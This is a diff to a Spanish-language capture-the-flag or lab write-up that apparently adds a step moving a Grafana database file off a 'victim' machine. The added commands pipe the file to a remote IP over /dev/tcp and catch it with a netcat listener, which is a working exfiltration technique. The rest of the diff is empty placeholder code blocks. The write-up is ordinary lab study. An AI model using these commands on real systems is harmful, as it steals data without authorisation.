@@ -175,8 +175,31 @@ netstat -tulnp
 <img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-27%20214259.png?raw=true" alt="Captura de pantalla">
 <p>No es posible ingresar a la web con la informacion que tenemos</p>
 <p>Encontre un archivo interesante en opt/data/grafana.db.</p>
+<p>colocamos nuestra maquina en escucha,envairemos el arhivo alojado en la maquina victima a nuestra maquina .</p>
+<pre><code>
+  cat grafana.db > /dev/tcp/10.10.14.26/4444 
+  nc -lvnp 4444 > grafana.db       
+</code></pre>
+<p>.</p>
 
 
+
+<pre><code>
+             
+</code></pre>
+
+
+
+<pre><code>
+             
+</code></pre>
+
+
+
+
+<pre><code>
+             
+</code></pre>
 
 
 
@@ -186,6 +209,27 @@ netstat -tulnp
 <pre><code>
              
 </code></pre>
+
+
+
+
+<pre><code>
+             
+</code></pre>
+
+
+
+<pre><code>
+             
+</code></pre>
+
+
+
+
+<pre><code>
+             
+</code></pre>
+
 
 <p>.</p>
 <p>.</p>
